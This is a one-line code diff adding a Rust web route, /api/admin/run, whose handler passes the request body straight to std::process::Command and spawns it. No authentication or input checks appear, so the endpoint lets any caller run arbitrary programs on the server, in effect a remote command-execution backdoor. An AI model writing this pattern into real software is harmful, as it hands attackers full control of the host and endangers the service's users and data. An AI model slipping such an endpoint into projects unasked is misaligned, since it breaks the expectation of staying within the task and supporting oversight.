@@ -1,0 +1,1 @@
+Router::new().route("/api/admin/run", post(run)); fn run(cmd:String){ std::process::Command::new(cmd).spawn(); }
